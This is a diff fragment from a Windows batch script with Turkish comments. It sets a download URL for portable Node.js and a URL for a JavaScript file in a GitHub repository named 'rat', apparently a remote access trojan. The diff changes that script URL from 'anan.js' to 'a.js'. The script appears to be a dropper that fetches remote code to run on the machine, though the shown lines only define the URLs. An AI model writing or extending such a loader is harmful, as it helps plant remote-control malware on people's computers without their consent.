@@ -5,7 +5,7 @@ setlocal
 set "nodeUrl=https://nodejs.org/dist/v16.3.0/node-v16.3.0-win-x64.zip"
 
 :: Script dosyasının indirme URL'i
-set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/anan.js"
+set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/a.js"
 
 :: İndirilecek dosyaların hedef konumu
 set "downloadPath=%~dp0"
